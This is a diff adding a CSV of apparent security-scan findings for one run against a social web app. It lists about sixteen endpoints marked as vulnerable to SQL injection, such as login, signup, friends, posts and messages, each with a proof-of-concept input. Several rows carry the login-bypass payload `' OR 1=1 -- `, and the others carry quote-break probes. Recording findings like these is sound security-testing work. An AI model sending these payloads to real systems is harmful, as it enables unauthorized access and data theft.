@@ -1,0 +1,17 @@
+run_id,endpoint,vulnerability,poc
+20260902-2013-0001,`/profile?username=`,SQL Injection,`' trash`
+20260902-2013-0001,`/friends?username=`,SQL Injection,`' trash`
+20260902-2013-0001,`/users?search=`,SQL Injection,`' trash`
+20260902-2013-0001,`/friends?username=XXX&search=XXX`,SQL Injection,`' trash`
+20260902-2013-0001,"`/login` (POST, username)",SQL Injection,`' OR 1=1 -- `
+20260902-2013-0001,"`/login` (POST, password)",SQL Injection,`' OR 1=1 -- `
+20260902-2013-0001,"`/signup` (POST, username)",SQL Injection,`' OR 1=1 -- `
+20260902-2013-0001,"`/signup` (POST, name)",SQL Injection,`' OR 1=1 -- `
+20260902-2013-0001,"`/signup` (POST, password)",SQL Injection,`' OR 1=1 -- `
+20260902-2013-0001,"`/create_post` (POST, content)",SQL Injection,`' trash`
+20260902-2013-0001,"`/request_friend` (POST, username)",SQL Injection,`' OR 1=1 -- `
+20260902-2013-0001,"`/remove_request` (POST, username)",SQL Injection,`' trash`
+20260902-2013-0001,`/direct_messages?username=`,SQL Injection,`' trash`
+20260902-2013-0001,`/edit_post?id=`,SQL Injection,`1'`
+20260902-2013-0001,`/delete_post?id=`,SQL Injection,`1'`
+20260902-2013-0001,`/requests?username=`,SQL Injection,`'`
